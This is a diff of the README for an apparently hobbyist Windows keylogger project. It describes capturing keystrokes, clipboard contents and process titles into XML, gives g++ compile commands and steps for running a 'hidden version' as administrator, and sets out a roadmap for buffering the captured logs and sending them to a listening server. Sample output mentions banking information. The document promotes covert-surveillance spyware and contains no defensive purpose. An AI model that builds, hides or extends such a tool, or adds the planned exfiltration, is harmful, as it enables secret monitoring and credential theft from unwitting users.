@@ -1,7 +1,7 @@
 ## KeyLogger
  version 0.0.2 DEVELOPMENT patch 
 
-this is a Windows based keylogger, it has multiple usefull features!, **This is still in alpha testing and dev** some of which are still under active development and i will be commiting features ASAP, once all the core features to make This keylogger work asdesired, and the compile script is formalized I will regiser the version 0.1.0 release, that will be the first stable point. but this version does work to some extent.
+this is a Windows based keylogger, it has multiple usefull features!, **This is still in alpha testing and dev** some of these features  are still under active development and I will be commiting features ASAP, once all the core features to make This keylogger work asdesired, and the compile script is formalized I will regiser the version 0.1.0 release, that will be the first stable point. but this version does work to some extent.
 
 currently Version 0.0.2 is capable of,
 
@@ -31,7 +31,7 @@ all the information collected by this program is formatted in xml, to view a sam
    open "Command Prompt" as an Administrator and navigate to the MinGW\bin
     do one of the following
     
-   **with window, for now this is the only real option untill updates are compleated**   
+   **with window**   
    
        c:\ ... \ MinGw\bin>g++ \ ... \ keylogger\keyloggersoftware\main.cpp \ ... \ keylogger\keyloggersoftware\Sanitize_KeylogBuff.cpp  -o \ ... \ keylogger\keyloggersoftware\keylogger.exe
    
@@ -53,7 +53,7 @@ all the information collected by this program is formatted in xml, to view a sam
   3)  open either of the xml output files in your browser of choice
   [**Note:** the banking info is not real credentials]
   
-  **Generating xml's**
+  **Running and Generating xml's**
   
   step 1) start command prompt as administrator.
   
@@ -75,7 +75,7 @@ all the information collected by this program is formatted in xml, to view a sam
   
   step 6) **for hidden version**
   
-  it is possible that the last process was not totaly logged, in this event you must manualy correct the xml untill I can write the socket, **this is still in alpha and development, problems exist!** if you scroll to the bottom of the file it should look as follows 
+  it is possible that the last process was not totaly logged, in this event you must manualy correct the xml untill I can write the socket, **this is still in alpha testing and development, problems exist!** if you scroll to the bottom of the file it should look as follows 
     
             	</logged>
 		</title>
@@ -120,13 +120,18 @@ at this point the end of your xml file should appear as follows
  there are multiple features I wish to add before the 0.1.0.
  
  1) generate xml formatted process entries in a buffer that can be encoded and sent to a listening server
- 
+ 	
+	**compleated part 1** this process now generate xml in a memory buffer, and is timed to send loggs after each process is captured.
+	**part 2** incompleate, encodeing and sending the data still has not been compleated.
+	
  2) create a server process capable of retrieving xml process entries
  
- 3) color code keylogger data captures and clipboard captures to make it easy to differentiate at a glance.
+ 3) color code keylogger data captures and clipboard captures to make it easy to differentiate at a glance
+ 
+ 	**COMPLEATE** the xsl stylesheet will color code all captured data makeing it easy to build comprehensive logs
  
  4) write a sanitizer function for currently unsanitized xml objects. (process title, clipboard, etc)
- 
+  
 # Developed and tested on the windows 10.
 # you can contact the comunity on slack
 
@@ -139,9 +144,9 @@ https://join.slack.com/t/qu3b411keylogger/shared_invite/enQtNDkzMjg4NDQ5MjQ4LWU2
 # TODO
   1.) debug sanitizer and xml output -- done besides end tag which still must be added
   
-  2.) write a sanitizer function for process titles.
+  2.) write a sanitizer function for process titles. **done** still need allot of testing, feedback would be amazing!!!
   
-  3.) restructure software for better output flow
+  3.) restructure software for better output flow **done**
   
   4.) set up buffered socket communication
   
@@ -150,8 +155,6 @@ https://join.slack.com/t/qu3b411keylogger/shared_invite/enQtNDkzMjg4NDQ5MjQ4LWU2
 # Known Issue
  1.) output is to the console has not been changed as of yet.
  
- 2.) errors in generating xml files in the described way may exit, further debugging must be done
- 
- 3.) an end </KeyLoggerMetaData> must be manually added to xml coppied off of the console as of this moment
+ 2.) an end </KeyLoggerMetaData> must be manually added to xml coppied off of the console as of this moment
  
 
